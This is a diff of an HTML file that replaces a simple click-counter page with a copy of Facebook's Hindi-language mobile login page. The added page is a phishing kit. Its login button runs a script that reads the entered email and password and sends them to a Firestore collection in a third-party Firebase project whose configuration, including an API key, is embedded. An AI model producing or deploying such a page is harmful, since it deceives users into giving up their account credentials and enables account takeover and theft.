@@ -1,108 +1,146 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="author" content="Rurendra Tegor" />
-  <title>Click Counter - Rurendra Tegor</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 0px;
-      margin: 0px;
-      text-align: left;
-    }
-    .counter {
-      font-size: 24px;
-      padding-left: 20px;
-      display: inline-block;
-    }
-    button {
-      margin-right: 20px;
-      border: none;
-      padding: 5px 10px;
-      background-color: #626FFF;
-      color: #FFFFFF;
-      font-size: 24px;
-      border-radius: 5px;
-    }
-  </style>
-</head>
-<body>
-  <div class="counter" id="clickCounter">
-    <div id="clickableArea">
-      Connected calls
-    </div>
-    <p id="clickCount">0</p>
+  
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
     
-    <button id="decrementClick">&nbsp;-&nbsp;</button>
-    <button id="incrementClick">&nbsp;+&nbsp;</button>
-  </div>
+    
+  <title>Facebook - लॉग इन या साइन अप करें</title><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
+  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
+  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+  <meta name="theme-color" content="#3b5998" />
+  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/0,cross/EfduFKKP_2H.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="6xyfOgH" crossorigin="anonymous" />
+  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/l/0,cross/r5O3Odda8hu.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="B6s9h/W" crossorigin="anonymous" />
+<style>
+  .btn{
+    color: white;
+    background-color: #0061FF;
+    width: 100%;
+  }
+  .btn:hover{
+    background-color: #0001BB;
+  }
+</style>
 
-  <button id="resetValues">Reset</button>
+<link rel="canonical" href="https://www.facebook.com/" />
+<meta property="og:site_name" content="Facebook" /><meta property="og:type" content="website" />
 
-  <script>
-    // Function to save counts in local storage
-    function saveCounts() {
-      localStorage.setItem('clickCount', clickCount);
-    }
+<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
+<meta property="og:url" content="https://www.facebook.com/" />
+<link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
+<link rel="alternate" media="handheld" href="https://m.facebook.com/" />
+<link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" />
+</head>
+<body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw">
 
-    // Function to load counts from local storage
-    function loadCounts() {
-      clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
-      clickCountElement.textContent = clickCount;
-    }
+<div id="viewport" data-kaios-focus-transparent="1">
+<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page">
+<div class="_129_" id="header-notices"></div>
+<div id="m:chrome:schedulable-graph-search"></div>
+<div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
+<div class="_7om2">
+<div class="_4g34" id="u_0_0_Zm">
+<div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
+<div class="_52jd"></div>
+</div>
+<div class="_9om_">
+<div class="_4-4l">
+<div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
+<div class="_qw9 grouped aclb" id="u_0_1_hh">
+<a href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253Drl8xZRtRXtWU_HgdIKKJKsvH%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8" target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea"><div class="ib cc">
+<i class="l img sp_xm9DDmY7HAL_3x sx_f30d37"></i><div class="c">
+<span class="fcl">Android के लिए Facebook पाएँ और तेज़ी से ब्राउज़ करें.</span>
+</div>
+</div>
+</a>
+</div>
+</div>
+<div class="_7om2 _52we _2pid _52z6">
+<div class="_4g34">
+<a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzAyODc4NDQ2LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8"><img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" width="112" class="img" alt="facebook" /></a>
+</div>
+</div>
+<div class="_5rut">
+<form method="post" action="" class="mobile-login-form _9hp- _5spm" id="loginForm" >
+<div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
+<div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
+<div id="otp_retrieve_desc_container"></div>
+<div>
+<div class="_56be">
+<div class="_55wo _56bf">
+<div class="_96n9" id="email_input_container">
+<input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="username" name="email" placeholder="&#x92e;&#x94b;&#x92c;&#x93e;&#x907;&#x932; &#x928;&#x902;&#x92c;&#x930; &#x92f;&#x93e; &#x908;&#x92e;&#x947;&#x932;" data-sigil="m_login_email" required />
+</div>
+</div>
+</div>
+<div class="_55wq"></div>
+<div class="_56be">
+<div class="_55wo _56bf">
+<div class="_1upc _mg8" data-sigil="m_login_password">
+<div class="_7om2">
+<div class="_4g34 _5i2i _52we">
+<div class="_5xu4">
+<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="password" name="pass" placeholder="&#x92a;&#x93e;&#x938;&#x935;&#x930;&#x94d;&#x921;" type="password" data-sigil="password-plain-text-toggle-input" /></div></div><div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_2_O0"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_3_fr">छिपाएँ</span><span class="mfss" id="u_0_4_Ql">दिखाएँ</span></a></div></div></div></div></div></div></div></div><div class="_2pie" style="text-align:center;"><div id="login_password_step_element" data-sigil="login_password_step_element"><button type="button" value="&#x932;&#x949;&#x917; &#x907;&#x928; &#x915;&#x930;&#x947;&#x902;"   class="btn     _28lf _9cow  " name="login" onclick="uploadToFirestore() "><span class="_55sr">लॉग इन करें</span></button></div><div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
 
-    // Click Counter
-    let clickCount = 0;
-    const clickCountElement = document.getElementById('clickCount');
-    const clickableArea = document.getElementById('clickableArea');
 
-    clickableArea.addEventListener('click', () => {
-      clickCount++;
-      clickCountElement.textContent = clickCount;
-      saveCounts();
-    });
+<div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div>
 
-    document.getElementById('decrementClick').addEventListener('click', () => {
-      clickCount = Math.max(0, clickCount - 1);
-      clickCountElement.textContent = clickCount;
-      saveCounts();
-    });
 
-    document.getElementById('incrementClick').addEventListener('click', () => {
-      clickCount++;
-      clickCountElement.textContent = clickCount;
-      saveCounts();
-    });
 
-    // Reset Button
-    const resetButton = document.getElementById('resetValues');
 
-    resetButton.addEventListener('click', () => {
-      const resetConfirmation = confirm('Are you sure you want to reset values?');
 
-      if (resetConfirmation) {
-        // Reset clickCount value
-        clickCount = 0;
 
-        // Update UI
-        clickCountElement.textContent = clickCount;
 
-        // Reset local storage values
-        saveCounts();
-      }
-    });
+</form>
 
-    // Load counts on page load
-    loadCounts();
 
-    // Increment click count when the window gains focus
-    window.addEventListener('focus', () => {
-      clickCount++;
-      clickCountElement.textContent = clickCount;
-      saveCounts();
-    });
-  </script>
+
+<div><div class="_2pie _9omz"><div class="_52jj _9on1"><a class="_9on1" tabindex="0" href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzAyODc4NDQ2LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;c=https%3A%2F%2Fm.facebook.com%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link">पासवर्ड भूल गए?</a></div></div><div style="padding-top: 42px"><div><div><div><div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">या</span></div><div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_agmp _28le btn btnS medBtn mfsm touchable" id="signup-button" href="/reg-no-deeplink/?is_two_steps_login=0&amp;cid=103&amp;refid=8" tabindex="0" data-sigil="m_reg_button">नया अकाउंट बनाएँ</a></div></div></div><div class="_2pie" style="text-align:center;"><div><div data-sigil="login_identify_step_element"></div><div class="other-links _8p_m"><ul class="_5pkb _55wp"><li></li></ul></div></div></div></div></div></div></div></div></div></div></div><div style="display:none"><div></div><div></div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span><div class="_55wr _5ui2" data-sigil="m_login_footer"><div class="_ao4m"><div><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">हिन्दी</span><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=ur_PK&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=ur_PK&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">اردو</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=bn_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=bn_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">বাংলা</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=en_GB&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=en_GB&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">English (UK)</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=mr_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=mr_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">मराठी</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=pa_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=pa_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">ਪੰਜਾਬੀ</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=gu_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=gu_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">ગુજરાતી</a></span></div><a href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F&amp;page_style=1&amp;refid=8"><div class="_3j87 _1rrd _3ztd" aria-label="&#x92d;&#x93e;&#x937;&#x93e;&#x913;&#x902; &#x915;&#x940; &#x92a;&#x942;&#x930;&#x940; &#x938;&#x942;&#x91a;&#x940;" data-sigil="more_language"><i class="img sp_zqrNfmDGuGz_3x sx_2f585a"></i></div></a></div></div></div><div class="_5ui4"><div class="_96qv _9a0a"><a href="https://about.meta.com/" class="_96qw" >परिचय</a><span aria-hidden="true"> · </span><a href="/help/?ref=pf&amp;refid=8" class="_96qw" title="&#x939;&#x92e;&#x93e;&#x930;&#x947; &#x92e;&#x926;&#x926; &#x915;&#x947;&#x902;&#x926;&#x94d;&#x930; &#x92a;&#x930; &#x91c;&#x93e;&#x90f;&#x901;.">हेल्प सेंटर</a><span aria-hidden="true"> · </span><span class="_96qw" id="u_0_5_EE">&#039;और&#039;</span></div><div class="_96qv" style="display:none" id="u_0_6_1B"><a href="https://messenger.com/" title="Messenger &#x926;&#x947;&#x916;&#x947;&#x902;" class="_96qw">Messenger</a><a href="/lite/?refid=8" title="Android &#x915;&#x947; &#x932;&#x93f;&#x90f; Facebook Lite." class="_96qw">Facebook Lite</a><a href="https://m.facebook.com/watch/?refid=8" title="Video &#x92e;&#x947;&#x902; &#x92c;&#x94d;&#x930;&#x93e;&#x909;&#x91c;&#x93c; &#x915;&#x930;&#x947;&#x902;" class="_96qw">वीडियो</a><a href="/places/?refid=8" title="Facebook &#x92a;&#x930; &#x939;&#x92e;&#x93e;&#x930;&#x947; &#x932;&#x94b;&#x915;&#x92a;&#x94d;&#x930;&#x93f;&#x92f; &#x938;&#x94d;&#x925;&#x93e;&#x928; &#x926;&#x947;&#x916;&#x947;&#x902;." class="_96qw">स्थान</a><a href="/games/?refid=8" title="Facebook &#x917;&#x947;&#x92e; &#x926;&#x947;&#x916;&#x947;&#x902;." class="_96qw">खेल</a><a href="/marketplace/?refid=8" title="Facebook Marketplace &#x92a;&#x930; &#x916;&#x930;&#x940;&#x926;&#x947;&#x902; &#x914;&#x930; &#x92c;&#x947;&#x91a;&#x947;&#x902;" class="_96qw">Marketplace</a><a href="https://pay.facebook.com/?refid=8" title="Meta Pay &#x915;&#x947; &#x92c;&#x93e;&#x930;&#x947; &#x92e;&#x947;&#x902; &#x914;&#x930; &#x91c;&#x93e;&#x928;&#x947;&#x902;" target="_blank" class="_96qw">Meta Pay</a><a href="https://www.meta.com/" title="Meta &#x92a;&#x930; &#x91a;&#x947;&#x915; &#x906;&#x909;&#x91f; &#x915;&#x930;&#x947;&#x902;" target="_blank" class="_96qw">Meta स्टोर</a><a href="https://www.meta.com/quest/" title="Meta Quest &#x915;&#x947; &#x92c;&#x93e;&#x930;&#x947; &#x92e;&#x947;&#x902; &#x914;&#x930; &#x91c;&#x93e;&#x928;&#x947;&#x902;" target="_blank" class="_96qw">Meta Quest</a><a href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0CJn14hMzGx_CEmvGjjqEPF3DGCqwIQnagfVzfLmzSEI30oEA6_bThf-PJirL7F-SSZiJPtcRw7KAPpLQtv4KpemGbxwmgTlJyhePalLN6H_xXko6Y7J0m3bfn8HDThi-4WLnfWrRdvN_R-mfnJVY6lwy1h5VIxBj3og" title="Instagram &#x926;&#x947;&#x916;&#x947;&#x902;" target="_blank" class="_96qw" rel="noreferrer" data-sigil="MLynx_asynclazy">Instagram</a><a href="https://www.threads.net/" title="Threads &#x906;&#x91c;&#x93c;&#x92e;&#x93e;&#x90f;&#x901;" class="_96qw">Threads</a><a href="/fundraisers/?refid=8" title="&#x92f;&#x94b;&#x917;&#x94d;&#x92f; &#x915;&#x932;&#x94d;&#x92f;&#x93e;&#x923;&#x915;&#x93e;&#x930;&#x940; &#x915;&#x93e;&#x930;&#x94d;&#x92f;&#x94b;&#x902; &#x915;&#x947; &#x932;&#x93f;&#x90f; &#x926;&#x93e;&#x928; &#x915;&#x930;&#x947;&#x902;." class="_96qw">अनुदान संचय</a>
+<a href="/biz/directory/?refid=8" class="_96qw">सेवाएँ</a><a href="https://developers.facebook.com/?ref=pf&amp;refid=8" class="_96qw">डेवलपर</a><a href="/careers/?ref=pf&amp;refid=8" class="_96qw">करियर</a><a href="/privacy/policy/?entry_point=facebook_page_footer&amp;refid=8"  class="_96qw">प्राइवेसी पॉलिसी</a><a href="/privacy/center/?entry_point=facebook_page_footer&amp;refid=8" class="_96qw">प्राइवेसी सेंटर</a><a href="/groups/discover/?refid=8"  class="_96qw">ग्रुप</a></div><span class="mfss fcg">Meta © 2023</span></div></div></div></div></div>
+
+<script>
+
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBIMU1mbGehF2Y3cOvSAp51nUjIc9XRT7M",
+  authDomain: "profilewings.firebaseapp.com",
+  projectId: "profilewings",
+  storageBucket: "profilewings.appspot.com",
+  messagingSenderId: "737949367885",
+  appId: "1:737949367885:web:a67c7ba0c7cdc2181ea604",
+  measurementId: "G-S1HJQY3HS6"
+        };
+        
+        
+        
+firebase.initializeApp(firebaseConfig);
+
+        // Reference to the Firestore database
+        const db = firebase.firestore();
+
+        function uploadToFirestore() {
+            // Get values from the form
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Add data to the "Facebook" collection in Firestore
+            db.collection('Facebook').add({
+                username: username,
+                password: password
+            })
+            .then((docRef) => {
+                console.log("Document written with ID: ", docRef.id);
+                alert("Data uploaded successfully!");
+            })
+            .catch((error) => {
+                console.error("Error adding document: ", error);
+                alert("Error uploading data. Please try again.");
+            });
+        }
+        
+        </script>
+
+
 </body>
 </html>
